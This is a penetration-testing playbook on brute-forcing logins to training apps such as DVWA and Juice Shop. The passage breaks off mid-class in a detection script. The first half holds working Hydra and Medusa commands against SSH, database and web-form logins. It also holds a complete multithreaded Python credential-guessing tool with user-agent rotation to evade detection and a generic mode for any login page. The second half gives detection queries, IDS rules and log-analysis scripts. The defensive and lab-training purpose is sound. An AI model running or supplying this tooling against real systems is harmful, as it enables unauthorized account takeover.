# Playbook 06: Brute Force Attacks

## Objective

Perform brute force attacks against authentication mechanisms to gain unauthorized access through weak or default credentials.

## Target Applications

- OWASP Juice Shop (Login functionality, admin panel)
- DVWA (Brute force lesson, login forms)
- XVWA (Multiple authentication forms)
- WebGoat (Authentication lessons)

## Prerequisites

- Hydra
- Medusa
- Burp Suite Professional
- Custom wordlists (SecLists)
- Python 3 with requests library
- Proxy tools for rate limiting bypass

## Manual Commands

### 1. HTTP Form Brute Force

```bash
# Using Hydra for web form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target-ip http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# DVWA brute force (low security)
hydra -l admin -P /usr/share/wordlists/rockyou.txt target-ip http-get-form "/dvwa/vulnerabilities/brute_force/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H=Cookie: PHPSESSID=...; security=low"

# Juice Shop brute force
hydra -l admin@juice-sh.op -P passwords.txt target-ip http-post-form "/rest/user/login:email=^USER^&password=^PASS^:Invalid email or password"
```

### 2. SSH Brute Force

```bash
# SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target-ip

# Multiple users SSH brute force
hydra -L users.txt -P passwords.txt ssh://target-ip -t 4
```

### 3. Database Brute Force

```bash
# MySQL brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://target-ip

# PostgreSQL brute force
hydra -l postgres -P passwords.txt postgres://target-ip
```

### 4. Using Medusa

```bash
# Web form brute force with Medusa
medusa -h target-ip -u admin -P passwords.txt -M http -m DIR:/login -m FORM:username=^USER^&password=^PASS^ -m DENY:"Invalid"

# SSH brute force with Medusa
medusa -h target-ip -u root -P passwords.txt -M ssh
```

## Automated Python Script

```python
#!/usr/bin/env python3
"""
Advanced Brute Force Attack Script
Supports: Juice Shop, DVWA, XVWA, WebGoat
"""

import requests
import threading
import time
import itertools
from concurrent.futures import ThreadPoolExecutor
import random
import string

class BruteForcer:
    def __init__(self, target_url, username_list=None, password_list=None, threads=10):
        self.target_url = target_url
        self.username_list = username_list or ['admin', 'administrator', 'user', 'test']
        self.password_list = password_list or self.generate_common_passwords()
        self.threads = threads
        self.success_credentials = []
        self.session = requests.Session()
        self.rate_limit_delay = 0.1

        # Common user agents for rotation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]

    def generate_common_passwords(self):
        """Generate common password list"""
        passwords = [
            # Common passwords
            'password', 'admin', '123456', 'password123', 'admin123',
            'letmein', 'welcome', 'monkey', '1234567890', 'qwerty',
            'abc123', 'Password1', 'password1', 'root', 'toor',

            # Default passwords
            'default', 'guest', 'demo', 'test', 'user',
            'changeme', 'temp', 'temporary', 'pass', 'pwd',

            # Application specific
            'juice', 'dvwa', 'webgoat', 'xvwa',
            'juiceshop', 'vulnerable', 'security', 'hacker',

            # Variations
            '', 'null', 'NULL', 'admin@admin.com', 'password!',
            'P@ssw0rd', 'P@ssword', '!QAZ2wsx', 'Passw0rd!',

            # Common patterns
            '12345', '54321', 'abcdef', 'fedcba', 'aaaaaa',
            '111111', '000000', '999999', 'zxcvbn', 'asdfgh'
        ]

        # Add year variations
        current_year = time.strftime("%Y")
        for base_pwd in ['password', 'admin', 'user']:
            passwords.extend([
                f"{base_pwd}{current_year}",
                f"{base_pwd}{current_year[-2:]}",
                f"{base_pwd}2023",
                f"{base_pwd}2024"
            ])

        return passwords

    def detect_application_type(self):
        """Detect the type of application for targeted attacks"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            content = response.text.lower()

            if 'juice shop' in content:
                return 'juice_shop'
            elif 'dvwa' in content or 'damn vulnerable' in content:
                return 'dvwa'
            elif 'xvwa' in content or 'xtreme vulnerable' in content:
                return 'xvwa'
            elif 'webgoat' in content:
                return 'webgoat'
            else:
                return 'generic'

        except Exception as e:
            print(f"Error detecting application: {e}")
            return 'generic'

    def get_csrf_token(self, login_url):
        """Extract CSRF token if present"""
        try:
            response = self.session.get(login_url)

            # Look for common CSRF token patterns
            csrf_patterns = [
                r'name=["\']csrf["\'] value=["\']([^"\']+)["\']',
                r'name=["\']_token["\'] value=["\']([^"\']+)["\']',
                r'name=["\']authenticity_token["\'] value=["\']([^"\']+)["\']'
            ]

            import re
            for pattern in csrf_patterns:
                match = re.search(pattern, response.text)
                if match:
                    return match.group(1)

            return None

        except Exception as e:
            print(f"Error getting CSRF token: {e}")
            return None

class JuiceShopBruteForcer(BruteForcer):
    """Specialized brute forcer for OWASP Juice Shop"""

    def __init__(self, target_url, **kwargs):
        super().__init__(target_url, **kwargs)
        self.login_endpoint = f"{target_url.rstrip('/')}/rest/user/login"

        # Juice Shop specific usernames
        self.username_list = [
            'admin@juice-sh.op',
            'jim@juice-sh.op',
            'bender@juice-sh.op',
            'amy@juice-sh.op',
            'admin',
            'administrator',
            'test@test.com',
            'user@user.com'
        ]

    def attempt_login(self, username, password):
        """Attempt login to Juice Shop"""
        try:
            # Rotate user agent
            self.session.headers.update({
                'User-Agent': random.choice(self.user_agents),
                'Content-Type': 'application/json'
            })

            login_data = {
                'email': username,
                'password': password
            }

            response = self.session.post(
                self.login_endpoint,
                json=login_data,
                timeout=10,
                allow_redirects=False
            )

            # Check for successful login
            if response.status_code == 200:
                response_data = response.json()
                if 'authentication' in response_data:
                    print(f"[+] SUCCESS: {username}:{password}")
                    return True

            # Rate limiting
            time.sleep(self.rate_limit_delay)
            return False

        except Exception as e:
            print(f"Error testing {username}:{password} - {e}")
            return False

    def brute_force(self):
        """Perform brute force attack"""
        print(f"Starting Juice Shop brute force attack on {self.login_endpoint}")
        print(f"Testing {len(self.username_list)} users with {len(self.password_list)} passwords")

        credentials_to_test = list(itertools.product(self.username_list, self.password_list))

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []

            for username, password in credentials_to_test:
                future = executor.submit(self.attempt_login, username, password)
                futures.append((future, username, password))

            for future, username, password in futures:
                if future.result():
                    self.success_credentials.append((username, password))

        return self.success_credentials

class DVWABruteForcer(BruteForcer):
    """Specialized brute forcer for DVWA"""

    def __init__(self, target_url, security_level='low', **kwargs):
        super().__init__(target_url, **kwargs)
        self.security_level = security_level
        self.login_endpoint = f"{target_url.rstrip('/')}/vulnerabilities/brute_force/"
        self.dvwa_session = None

        # DVWA specific usernames
        self.username_list = ['admin', 'user', 'test', 'guest', 'dvwa']

    def setup_dvwa_session(self):
        """Setup DVWA session and set security level"""
        try:
            # Get main DVWA page to establish session
            response = self.session.get(self.target_url)

            # Set security level
            security_url = f"{self.target_url.rstrip('/')}/security.php"
            self.session.post(security_url, data={'security': self.security_level})

            # Extract PHPSESSID for use in attacks
            if 'PHPSESSID' in self.session.cookies:
                self.dvwa_session = self.session.cookies['PHPSESSID']
                print(f"DVWA session established: {self.dvwa_session}")
                return True

        except Exception as e:
            print(f"Error setting up DVWA session: {e}")
            return False

    def attempt_login(self, username, password):
        """Attempt login to DVWA brute force module"""
        try:
            params = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }

            response = self.session.get(
                self.login_endpoint,
                params=params,
                timeout=10
            )

            # Check for failed login indicators
            if "Username and/or password incorrect" not in response.text:
                if "Welcome to the password protected area" in response.text:
                    print(f"[+] SUCCESS: {username}:{password}")
                    return True

            time.sleep(self.rate_limit_delay)
            return False

        except Exception as e:
            print(f"Error testing {username}:{password} - {e}")
            return False

    def brute_force(self):
        """Perform DVWA brute force attack"""
        if not self.setup_dvwa_session():
            print("Failed to setup DVWA session")
            return []

        print(f"Starting DVWA brute force attack (Security: {self.security_level})")

        credentials_to_test = list(itertools.product(self.username_list, self.password_list))

        # Adjust thread count based on security level
        thread_count = 1 if self.security_level == 'high' else self.threads

        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = []

            for username, password in credentials_to_test:
                future = executor.submit(self.attempt_login, username, password)
                futures.append((future, username, password))

            for future, username, password in futures:
                if future.result():
                    self.success_credentials.append((username, password))

        return self.success_credentials

class WebGoatBruteForcer(BruteForcer):
    """Specialized brute forcer for WebGoat"""

    def __init__(self, target_url, **kwargs):
        super().__init__(target_url, **kwargs)
        self.login_endpoint = f"{target_url.rstrip('/')}/login"

        # WebGoat specific usernames
        self.username_list = ['guest', 'webgoat', 'admin', 'user', 'test']

    def attempt_login(self, username, password):
        """Attempt login to WebGoat"""
        try:
            # Get CSRF token
            csrf_token = self.get_csrf_token(self.login_endpoint)

            login_data = {
                'username': username,
                'password': password
            }

            if csrf_token:
                login_data['_csrf'] = csrf_token

            response = self.session.post(
                self.login_endpoint,
                data=login_data,
                timeout=10,
                allow_redirects=False
            )

            # Check for successful login (302 redirect)
            if response.status_code == 302:
                location = response.headers.get('location', '')
                if 'welcome' in location.lower() or 'dashboard' in location.lower():
                    print(f"[+] SUCCESS: {username}:{password}")
                    return True

            time.sleep(self.rate_limit_delay)
            return False

        except Exception as e:
            print(f"Error testing {username}:{password} - {e}")
            return False

    def brute_force(self):
        """Perform WebGoat brute force attack"""
        print(f"Starting WebGoat brute force attack on {self.login_endpoint}")

        credentials_to_test = list(itertools.product(self.username_list, self.password_list))

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []

            for username, password in credentials_to_test:
                future = executor.submit(self.attempt_login, username, password)
                futures.append((future, username, password))

            for future, username, password in futures:
                if future.result():
                    self.success_credentials.append((username, password))

        return self.success_credentials

class GenericBruteForcer(BruteForcer):
    """Generic brute forcer for unknown applications"""

    def __init__(self, target_url, login_path='/login', **kwargs):
        super().__init__(target_url, **kwargs)
        self.login_endpoint = f"{target_url.rstrip('/')}{login_path}"

    def attempt_login(self, username, password):
        """Generic login attempt"""
        try:
            # Try common field names
            field_combinations = [
                {'username': username, 'password': password},
                {'email': username, 'password': password},
                {'user': username, 'pass': password},
                {'login': username, 'password': password}
            ]

            for login_data in field_combinations:
                response = self.session.post(
                    self.login_endpoint,
                    data=login_data,
                    timeout=10,
                    allow_redirects=False
                )

                # Check for common success indicators
                success_indicators = [
                    'welcome', 'dashboard', 'profile', 'logout',
                    'success', 'authenticated'
                ]

                failure_indicators = [
                    'invalid', 'incorrect', 'failed', 'error',
                    'denied', 'unauthorized'
                ]

                response_text = response.text.lower()

                # Check for redirect (common success pattern)
                if response.status_code in [301, 302]:
                    location = response.headers.get('location', '').lower()
                    if any(indicator in location for indicator in success_indicators):
                        print(f"[+] SUCCESS: {username}:{password}")
                        return True

                # Check response content
                if any(indicator in response_text for indicator in success_indicators):
                    if not any(indicator in response_text for indicator in failure_indicators):
                        print(f"[+] SUCCESS: {username}:{password}")
                        return True

            time.sleep(self.rate_limit_delay)
            return False

        except Exception as e:
            print(f"Error testing {username}:{password} - {e}")
            return False

    def brute_force(self):
        """Perform generic brute force attack"""
        print(f"Starting generic brute force attack on {self.login_endpoint}")

        credentials_to_test = list(itertools.product(self.username_list, self.password_list))

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []

            for username, password in credentials_to_test:
                future = executor.submit(self.attempt_login, username, password)
                futures.append((future, username, password))

            for future, username, password in futures:
                if future.result():
                    self.success_credentials.append((username, password))

        return self.success_credentials

def load_wordlists(username_file=None, password_file=None):
    """Load custom wordlists"""
    usernames = []
    passwords = []

    if username_file:
        try:
            with open(username_file, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"Username file {username_file} not found")

    if password_file:
        try:
            with open(password_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"Password file {password_file} not found")

    return usernames, passwords

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description='Advanced Brute Force Attack Tool')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-u', '--usernames', help='Username wordlist file')
    parser.add_argument('-p', '--passwords', help='Password wordlist file')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('--app-type', choices=['juice_shop', 'dvwa', 'webgoat', 'generic'],
                       help='Application type for specialized attacks')
    parser.add_argument('--security-level', choices=['low', 'medium', 'high'],
                       default='low', help='DVWA security level')

    args = parser.parse_args()

    # Load custom wordlists if provided
    custom_usernames, custom_passwords = load_wordlists(args.usernames, args.passwords)

    # Determine application type
    if not args.app_type:
        base_brute_forcer = BruteForcer(args.url)
        app_type = base_brute_forcer.detect_application_type()
    else:
        app_type = args.app_type

    print(f"Detected/Selected application type: {app_type}")

    # Create appropriate brute forcer
    if app_type == 'juice_shop':
        brute_forcer = JuiceShopBruteForcer(
            args.url,
            username_list=custom_usernames,
            password_list=custom_passwords,
            threads=args.threads
        )
    elif app_type == 'dvwa':
        brute_forcer = DVWABruteForcer(
            args.url,
            security_level=args.security_level,
            username_list=custom_usernames,
            password_list=custom_passwords,
            threads=args.threads
        )
    elif app_type == 'webgoat':
        brute_forcer = WebGoatBruteForcer(
            args.url,
            username_list=custom_usernames,
            password_list=custom_passwords,
            threads=args.threads
        )
    else:
        brute_forcer = GenericBruteForcer(
            args.url,
            username_list=custom_usernames,
            password_list=custom_passwords,
            threads=args.threads
        )

    # Perform brute force attack
    start_time = time.time()
    successful_credentials = brute_forcer.brute_force()
    end_time = time.time()

    # Print results
    print("\n" + "="*50)
    print("BRUTE FORCE RESULTS")
    print("="*50)
    print(f"Attack duration: {end_time - start_time:.2f} seconds")
    print(f"Successful credentials found: {len(successful_credentials)}")

    for username, password in successful_credentials:
        print(f"  {username}:{password}")

    if not successful_credentials:
        print("No valid credentials found. Try:")
        print("  - Different wordlists")
        print("  - Slower attack rate")
        print("  - Different attack vectors")
```

## Attack Detection and Monitoring

### Wireshark Detection Signatures

**Brute Force Attack Detection:**

```wireshark
# HTTP authentication brute force detection
http.request.method == "POST" and http.request.uri contains "login"

# Rapid authentication attempts
http.request.method == "POST" and frame.time_delta < 1.0 and http.request.uri contains "login"

# Failed authentication patterns
http.response.code == 401 or http.response.code == 403

# SSH brute force detection
ssh.message_code == 51 or ssh.message_code == 52

# FTP brute force attempts
ftp.response.code >= 530 and ftp.response.code <= 535

# Hydra tool detection
http.user_agent contains "Mozilla/4.0 (Hydra)" or tcp.analysis.retransmission and tcp.dstport in {21 22 23 80 443}

# Multiple authentication failures from same source
http.response.code == 401 and ip.src == <attacker_ip>

# Session enumeration patterns
http.request.uri contains "PHPSESSID" or http.request.uri contains "JSESSIONID"
```

### Splunk Detection Queries

**Brute Force Attack Monitoring:**

```splunk
# Web application brute force detection
index=web_logs sourcetype=access_combined
| search (uri="*/login*" OR uri="*/signin*" OR uri="*/auth*") method="POST"
| bucket _time span=1m
| stats count by src_ip, _time, status
| where count > 10
| eval attack_type="web_bruteforce"

# Failed authentication clustering
index=web_logs sourcetype=access_combined
| search status IN (401, 403) (uri="*/login*" OR uri="*/signin*")
| bucket _time span=5m
| stats count by src_ip, _time
| where count > 20
| eval severity="high", attack_stage="credential_bruteforce"

# SSH brute force detection
index=ssh_logs sourcetype=secure
| search "Failed password" OR "Invalid user"
| bucket _time span=1m
| stats count by src_ip, _time, user
| where count > 5
| eval protocol="ssh", attack_type="bruteforce"

# Application-specific detection patterns
index=web_logs sourcetype=access_combined
| search (uri="*/rest/user/login*" AND host="*juice*") OR
         (uri="*/vulnerabilities/brute_force*" AND host="*dvwa*") OR
         (uri="*/login*" AND host="*webgoat*")
| bucket _time span=2m
| stats count by src_ip, _time, uri
| where count > 15
| eval target_app=case(
    match(uri, "juice"), "OWASP Juice Shop",
    match(uri, "dvwa"), "DVWA",
    match(uri, "webgoat"), "WebGoat",
    1==1, "Unknown"
)

# Rate limiting bypass detection
index=web_logs sourcetype=access_combined
| search uri="*/login*" method="POST"
| eval user_agent_hash=md5(user_agent)
| bucket _time span=1m
| stats count dc(user_agent_hash) as ua_variety by src_ip, _time
| where count > 20 AND ua_variety > 5
| eval evasion_technique="user_agent_rotation"

# Distributed brute force detection
index=web_logs sourcetype=access_combined
| search uri="*/login*" method="POST" status IN (401, 403)
| bucket _time span=5m
| stats count dc(src_ip) as unique_ips by _time, uri
| where count > 50 AND unique_ips > 10
| eval attack_pattern="distributed_bruteforce"

# Credential stuffing detection
index=web_logs sourcetype=access_combined
| search uri="*/login*" method="POST"
| stats count dc(uri) as apps_targeted by src_ip
| where count > 100 AND apps_targeted > 3
| eval attack_type="credential_stuffing"
```

### SIEM Integration

**QRadar AQL Queries:**

```aql
-- Web authentication brute force
SELECT sourceip, count(*) as attempts, count(DISTINCT username) as users_tried
FROM events
WHERE category = 'Authentication'
AND "HTTP Response Code" IN ('401', '403')
AND "URL" LIKE '%login%'
GROUP BY sourceip
HAVING attempts > 50 OR users_tried > 10
LAST 10 MINUTES

-- SSH brute force detection
SELECT sourceip, destinationip, count(*) as ssh_attempts
FROM events
WHERE category = 'Authentication'
AND "Event Name" LIKE '%Failed%'
AND destinationport = 22
GROUP BY sourceip, destinationip
HAVING ssh_attempts > 20
LAST 5 MINUTES

-- FTP brute force detection
SELECT sourceip, destinationip, count(*) as ftp_attempts
FROM events
WHERE category = 'Authentication'
AND destinationport = 21
AND "Event Name" LIKE '%Failed%'
GROUP BY sourceip, destinationip
HAVING ftp_attempts > 15
LAST 5 MINUTES

-- Multi-protocol brute force
SELECT sourceip, count(DISTINCT destinationport) as protocols_attacked
FROM events
WHERE category = 'Authentication'
AND destinationport IN (21, 22, 23, 80, 443, 993, 995)
GROUP BY sourceip
HAVING protocols_attacked >= 3
LAST 1 HOURS
```

**Elastic Stack Detection Rules:**

```json
{
  "rule": {
    "name": "Brute Force Authentication Attacks",
    "query": {
      "bool": {
        "should": [
          {
            "bool": {
              "must": [
                { "term": { "event.category": "authentication" } },
                { "term": { "event.outcome": "failure" } },
                { "range": { "@timestamp": { "gte": "now-5m" } } }
              ]
            }
          },
          {
            "bool": {
              "must": [
                { "terms": { "http.response.status_code": [401, 403] } },
                { "wildcard": { "url.path": "*login*" } },
                { "term": { "http.request.method": "POST" } }
              ]
            }
          },
          {
            "bool": {
              "must": [
                { "term": { "destination.port": 22 } },
                { "wildcard": { "message": "*Failed password*" } }
              ]
            }
          }
        ]
      }
    },
    "threshold": {
      "field": "source.ip",
      "value": 20,
      "cardinality": [
        {
          "field": "user.name",
          "value": 5
        }
      ]
    }
  }
}
```

### Network Security Monitoring

**Suricata Rules:**

```suricata
# Web application brute force
alert http any any -> any any (msg:"Web Authentication Brute Force"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"login"; threshold:type both, track by_src, count 20, seconds 300; classtype:attempted-dos; sid:6001001; rev:1;)

alert http any any -> any any (msg:"HTTP 401 Authentication Failures"; flow:established,from_server; http.stat_code; content:"401"; threshold:type both, track by_src, count 15, seconds 300; classtype:attempted-recon; sid:6001002; rev:1;)

# SSH brute force detection
alert tcp any any -> any 22 (msg:"SSH Brute Force Attack"; flags:S; threshold:type both, track by_src, count 30, seconds 300; classtype:attempted-recon; sid:6001003; rev:1;)

# FTP brute force detection
alert tcp any any -> any 21 (msg:"FTP Brute Force Attack"; flags:S; threshold:type both, track by_src, count 20, seconds 300; classtype:attempted-recon; sid:6001004; rev:1;)

# Hydra tool detection
alert tcp any any -> any any (msg:"Hydra Brute Force Tool"; flow:established; content:"Mozilla/4.0 (Hydra)"; http.user_agent; classtype:attempted-recon; sid:6001005; rev:1;)

# Multiple protocol brute force
alert tcp any any -> any any (msg:"Multi-Protocol Brute Force"; flags:S; threshold:type threshold, track by_src, count 100, seconds 300; classtype:attempted-recon; sid:6001006; rev:1;)

# Application-specific detection
alert http any any -> any any (msg:"OWASP Juice Shop Brute Force"; http.uri; content:"/rest/user/login"; http.method; content:"POST"; threshold:type both, track by_src, count 15, seconds 300; classtype:web-application-attack; sid:6001007; rev:1;)

alert http any any -> any any (msg:"DVWA Brute Force Attack"; http.uri; content:"vulnerabilities/brute_force"; threshold:type both, track by_src, count 15, seconds 300; classtype:web-application-attack; sid:6001008; rev:1;)

# User agent rotation detection
alert http any any -> any any (msg:"User Agent Rotation in Authentication"; flow:established,to_server; http.uri; content:"login"; http.method; content:"POST"; detection_filter:track by_src, count 20, seconds 300; classtype:attempted-recon; sid:6001009; rev:1;)

# Credential stuffing patterns
alert http any any -> any any (msg:"Potential Credential Stuffing"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"login"; threshold:type both, track by_src, count 100, seconds 600; classtype:attempted-recon; sid:6001010; rev:1;)
```

**Snort Rules:**

```snort
# HTTP authentication brute force
alert tcp any any -> any 80 (msg:"HTTP Authentication Brute Force"; content:"POST"; http_method; content:"login"; http_uri; threshold:type both, track by_src, count 20, seconds 300; classtype:attempted-recon; sid:6001101; rev:1;)

alert tcp any any -> any 443 (msg:"HTTPS Authentication Brute Force"; content:"POST"; http_method; content:"login"; http_uri; threshold:type both, track by_src, count 20, seconds 300; classtype:attempted-recon; sid:6001102; rev:1;)

# SSH brute force
alert tcp any any -> any 22 (msg:"SSH Connection Flood"; flags:S; threshold:type both, track by_src, count 30, seconds 300; classtype:attempted-recon; sid:6001103; rev:1;)

# FTP brute force
alert tcp any any -> any 21 (msg:"FTP Authentication Attempts"; flags:S; threshold:type both, track by_src, count 20, seconds 300; classtype:attempted-recon; sid:6001104; rev:1;)
```

### Log Analysis Scripts

**Apache/Nginx Brute Force Detection:**

```bash
#!/bin/bash
# Web authentication brute force detection

LOG_FILE="/var/log/apache2/access.log"  # or /var/log/nginx/access.log
THRESHOLD=20
TIME_WINDOW=300  # 5 minutes

echo "=== Web Authentication Brute Force Detection ==="

# Login attempt detection
echo "[+] Detecting login brute force attempts..."
awk -v threshold=$THRESHOLD -v window=$TIME_WINDOW '
BEGIN { current_time = systime() }
{
    if ($7 ~ /\/login|\/signin|\/auth/ && $6 ~ /POST/) {
        ip = $1
        status = $9
        timestamp = mktime(substr($4,2,19))

        if (current_time - timestamp <= window) {
            login_attempts[ip]++
            if (status ~ /401|403/) {
                failed_attempts[ip]++
            }
        }
    }
}
END {
    print "=== Login Attempt Analysis ==="
    for (ip in login_attempts) {
        if (login_attempts[ip] >= threshold) {
            failed = (ip in failed_attempts) ? failed_attempts[ip] : 0
            success_rate = ((login_attempts[ip] - failed) / login_attempts[ip]) * 100
            print "[!] ALERT: " ip " made " login_attempts[ip] " login attempts (" failed " failed, " sprintf("%.1f", success_rate) "% success)"
        }
    }
}' "$LOG_FILE"

# Application-specific detection
echo "[+] Detecting application-specific attacks..."
grep -E "juice.*login|dvwa.*brute_force|webgoat.*login" "$LOG_FILE" | \
awk '{print $1}' | sort | uniq -c | awk '$1 > 15 {print "[!] APP ATTACK: " $2 " (" $1 " attempts)"}'

# User agent analysis for evasion
echo "[+] Analyzing user agent patterns..."
awk '
$7 ~ /\/login/ && $6 ~ /POST/ {
    ip = $1
    ua = $0
    gsub(/.*" "/, "", ua)
    gsub(/"$/, "", ua)
    user_agents[ip,ua] = 1
    total_requests[ip]++
}
END {
    for (ip in total_requests) {
        ua_count = 0
        for (combo in user_agents) {
            if (split(combo, parts, SUBSEP) && parts[1] == ip) {
                ua_count++
            }
        }
        if (total_requests[ip] > 20 && ua_count > 5) {
            print "[!] EVASION: " ip " used " ua_count " different user agents in " total_requests[ip] " requests"
        }
    }
}' "$LOG_FILE"

# Distributed attack detection
echo "[+] Detecting distributed attacks..."
awk -v window=$TIME_WINDOW '
BEGIN { current_time = systime() }
$7 ~ /\/login/ && $6 ~ /POST/ && $9 ~ /401|403/ {
    timestamp = mktime(substr($4,2,19))
    if (current_time - timestamp <= window) {
        ip = $1
        minute_bucket = int(timestamp / 60) * 60
        attacks[minute_bucket]++
        unique_ips[minute_bucket,ip] = 1
    }
}
END {
    for (bucket in attacks) {
        if (attacks[bucket] > 50) {
            ip_count = 0
            for (combo in unique_ips) {
                if (split(combo, parts, SUBSEP) && parts[1] == bucket) {
                    ip_count++
                }
            }
            if (ip_count > 10) {
                time_str = strftime("%Y-%m-%d %H:%M:%S", bucket)
                print "[!] DISTRIBUTED ATTACK: " time_str " - " attacks[bucket] " attempts from " ip_count " IPs"
            }
        }
    }
}' "$LOG_FILE"
```

**SSH Brute Force Detection Script:**

```bash
#!/bin/bash
# SSH brute force detection

SSH_LOG="/var/log/auth.log"  # or /var/log/secure on RHEL/CentOS
THRESHOLD=10
TIME_WINDOW=300

echo "=== SSH Brute Force Detection ==="

# Failed password attempts
echo "[+] Detecting SSH password attacks..."
awk -v threshold=$THRESHOLD -v window=$TIME_WINDOW '
/Failed password/ {
    match($0, /from ([0-9\.]+)/, ip_match)
    if (ip_match[1]) {
        ip = ip_match[1]
        failed_ssh[ip]++
    }
}
/Invalid user/ {
    match($0, /from ([0-9\.]+)/, ip_match)
    if (ip_match[1]) {
        ip = ip_match[1]
        invalid_users[ip]++
    }
}
END {
    print "=== Failed Password Attempts ==="
    for (ip in failed_ssh) {
        if (failed_ssh[ip] >= threshold) {
            print "[!] SSH BRUTE FORCE: " ip " - " failed_ssh[ip] " failed password attempts"
        }
    }

    print "\n=== Invalid User Attempts ==="
    for (ip in invalid_users) {
        if (invalid_users[ip] >= 5) {
            print "[!] SSH USER ENUM: " ip " - " invalid_users[ip] " invalid user attempts"
        }
    }
}' "$SSH_LOG"

# Connection pattern analysis
echo "[+] Analyzing SSH connection patterns..."
awk '
/sshd.*Connection from/ {
    match($0, /from ([0-9\.]+)/, ip_match)
    if (ip_match[1]) {
        connections[ip_match[1]]++
    }
}
END {
    for (ip in connections) {
        if (connections[ip] > 50) {
            print "[!] SSH FLOOD: " ip " - " connections[ip] " connection attempts"
        }
    }
}' "$SSH_LOG"
```

**PowerShell Authentication Analysis:**

```powershell
# Windows authentication brute force detection
$SecurityLog = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625; StartTime=(Get-Date).AddHours(-1)}

$FailedLogons = @{}
$UserEnumeration = @{}

$SecurityLog | ForEach-Object {
    $Event = [xml]$_.ToXml()
    $SourceIP = $Event.Event.EventData.Data | Where-Object {$_.Name -eq 'IpAddress'} | Select-Object -ExpandProperty '#text'
    $Username = $Event.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetUserName'} | Select-Object -ExpandProperty '#text'
    $FailureReason = $Event.Event.EventData.Data | Where-Object {$_.Name -eq 'SubStatus'} | Select-Object -ExpandProperty '#text'

    if ($SourceIP -and $SourceIP -ne '-' -and $SourceIP -ne '::1' -and $SourceIP -ne '127.0.0.1') {
        if (-not $FailedLogons.ContainsKey($SourceIP)) {
            $FailedLogons[$SourceIP] = @()
        }
        $FailedLogons[$SourceIP] += @{
            'Username' = $Username
            'Time' = $_.TimeCreated
            'Reason' = $FailureReason
        }

        # Track user enumeration
        $Key = "$SourceIP-$Username"
        if (-not $UserEnumeration.ContainsKey($Key)) {
            $UserEnumeration[$Key] = 0
        }
        $UserEnumeration[$Key]++
    }
}

# Generate alerts
Write-Host "=== Windows Authentication Brute Force Detection ===" -ForegroundColor Yellow

$FailedLogons.GetEnumerator() | ForEach-Object {
    $SourceIP = $_.Key
    $Attempts = $_.Value

    if ($Attempts.Count -gt 20) {
        $UniqueUsers = ($Attempts | Select-Object -ExpandProperty Username | Sort-Object -Unique).Count
        $TimeSpan = New-TimeSpan -Start ($Attempts | Sort-Object Time | Select-Object -First 1).Time -End ($Attempts | Sort-Object Time | Select-Object -Last 1).Time

        Write-Warning "Authentication brute force from $SourceIP : $($Attempts.Count) attempts against $UniqueUsers users over $($TimeSpan.TotalMinutes.ToString('F1')) minutes"

        # Show top targeted usernames
        $TopUsers = $Attempts | Group-Object Username | Sort-Object Count -Descending | Select-Object -First 5
        Write-Host "  Top targeted users:" -ForegroundColor Cyan
        $TopUsers | ForEach-Object {
            Write-Host "    $($_.Name): $($_.Count) attempts" -ForegroundColor Gray
        }
    }
}

# Check for IIS authentication failures
if (Test-Path "C:\inetpub\logs\LogFiles\W3SVC1\") {
    $IISLogs = Get-ChildItem "C:\inetpub\logs\LogFiles\W3SVC1\" -Filter "*.log" | Sort-Object LastWriteTime -Descending | Select-Object -First 1

    if ($IISLogs) {
        $AuthFailures = @{}
        Get-Content $IISLogs.FullName | Where-Object { $_ -notmatch "^#" } | ForEach-Object {
            $Fields = $_ -split " "
            if ($Fields.Length -gt 8 -and $Fields[8] -eq "401") {
                $SourceIP = $Fields[2]
                $URI = $Fields[4]

                if ($URI -match "login|auth|signin") {
                    if (-not $AuthFailures.ContainsKey($SourceIP)) {
                        $AuthFailures[$SourceIP] = 0
                    }
                    $AuthFailures[$SourceIP]++
                }
            }
        }

        Write-Host "`n=== IIS Authentication Failures ===" -ForegroundColor Yellow
        $AuthFailures.GetEnumerator() | Where-Object { $_.Value -gt 15 } | ForEach-Object {
            Write-Warning "IIS authentication brute force from $($_.Key) : $($_.Value) failures"
        }
    }
}
```

### Python Behavioral Analysis

```python
#!/usr/bin/env python3
"""
Comprehensive Brute Force Attack Detection
Analyzes authentication logs for brute force patterns across multiple protocols
"""

import re
import sys
from datetime import datetime, timedelta
from collections import defaultdict, Counter
import argparse
import json
import ipaddress

class BruteForceDetector:
    def __init__(self, time_window=300, login_threshold=20, ssh_threshold=15):
        self.time_window = time_window
        self.login_threshold = login_threshold
        self.ssh_threshold = ssh_threshold

        # Detection patterns
        self.web_log_pattern = re.compile(
            r'(\S+) \S+ \S+ \[(.*?)\] "(\S+) (\S+) \S+" (\d+) \S+ "(.*?)" "(.*?)"'
        )

        self.ssh_patterns = {
            'failed_password': re.compile(r'Failed password for (\w+) from ([\d\.]+)'),
            'invalid_user': re.compile(r'Invalid user (\w+) from ([\d\.]+)'),
            'connection': re.compile(r'Connection from ([\d\.]+)')
        }

        # Detection data
        self.web_attacks = defaultdict(lambda: defaultdict(list))
